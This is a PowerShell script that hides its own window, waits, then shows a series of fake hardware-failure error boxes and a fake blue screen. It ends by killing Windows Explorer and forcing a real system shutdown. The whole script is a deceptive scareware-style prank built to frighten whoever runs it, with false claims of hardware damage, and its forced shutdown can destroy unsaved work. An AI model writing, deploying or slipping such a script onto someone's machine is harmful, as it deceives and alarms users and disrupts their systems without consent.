# Clear PowerShell window immediately (hide execution)
Clear-Host

# Hide PowerShell & Command Prompt windows
$psWindow = (Get-Process -Id $PID).MainWindowHandle

# Create a hidden command prompt that forces PowerShell to minimize
Start-Process -WindowStyle Hidden cmd.exe -ArgumentList "/c start /min powershell -NoExit -Command `exit`"

# Check if WinAPI type is already defined (prevents duplicate errors)
if (-not ([System.Management.Automation.PSTypeName]'WinAPI').Type) {
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class WinAPI {
        [DllImport("user32.dll")]
        public static extern int ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll")]
        public static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);
    }
"@
}

# Hide PowerShell
[void][WinAPI]::ShowWindow($psWindow, 0)

# Wait 15 seconds before doing anything (Suspense)
Start-Sleep -Seconds 15

# Function to show fake error messages
function Show-Error {
    param (
        [string]$message,
        [string]$title
    )
    [void][WinAPI]::MessageBox([IntPtr]::Zero, $message, $title, 0x10)
}

# List of random realistic system failure messages
$errors = @(
    "System Overload: Voltage Surge Detected on PCI Bus.",
    "BIOS Integrity Failure: Checksum Mismatch Detected!",
    "Critical RAM Malfunction: Data Leakage Detected.",
    "Kernel Security Check Failure: Unauthorized Memory Write!",
    "Corrupt Memory Stack: System Data May Be Permanently Lost!",
    "Motherboard Bus Failure: Southbridge Chip Unresponsive!",
    "Fatal Error: Liquid Intrusion Detected Near CPU Socket!",
    "Memory Controller Failure: Incorrect Read/Write Values!",
    "VRM Overheat Detected: System May Experience Irreversible Damage!",
    "CPU Registers Corrupt: Unexpected Instruction Set Detected!",
    "Data Storage Fault: Filesystem Integrity Compromised!",
    "Thermal Protection Override: Temperature Sensors Disabled!"
)

# Show error messages at random intervals
for ($i = 0; $i -lt 6; $i++) {
    Show-Error ($errors | Get-Random) "SYSTEM CRITICAL ERROR"
    Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 12)
}

# Fake BSOD Sequence - Reveal PowerShell for dramatic effect
[void][WinAPI]::ShowWindow($psWindow, 5)

# Fake Blue Screen using Command Prompt
Start-Process "cmd.exe" -ArgumentList "/c color 1F && mode con cols=80 lines=25 && echo A critical system error has occurred... && timeout 10" -NoNewWindow -Wait

# Fake Memory Crash Effect (Flashing Terminal)
for ($i=0; $i -lt 4; $i++) {
    Start-Process "cmd.exe" -ArgumentList "/c color 4F && echo Memory corruption spreading! && timeout 1" -NoNewWindow -Wait
    Start-Process "cmd.exe" -ArgumentList "/c color 1F && echo CRITICAL FAILURE! Kernel Error!" -NoNewWindow -Wait
}

# Final catastrophic error message
Show-Error "OS integrity compromised! Immediate shutdown required to prevent hardware damage!" "FATAL SYSTEM ERROR"

# Make Windows Explorer disappear (blank screen effect)
Stop-Process -Name explorer -Force
Start-Sleep -Seconds 5

# Fake Forced Shutdown
Start-Process "shutdown.exe" -ArgumentList "/s /t 5 /c 'Critical system instability detected! Immediate power off required!'" -NoNewWindow -Wait
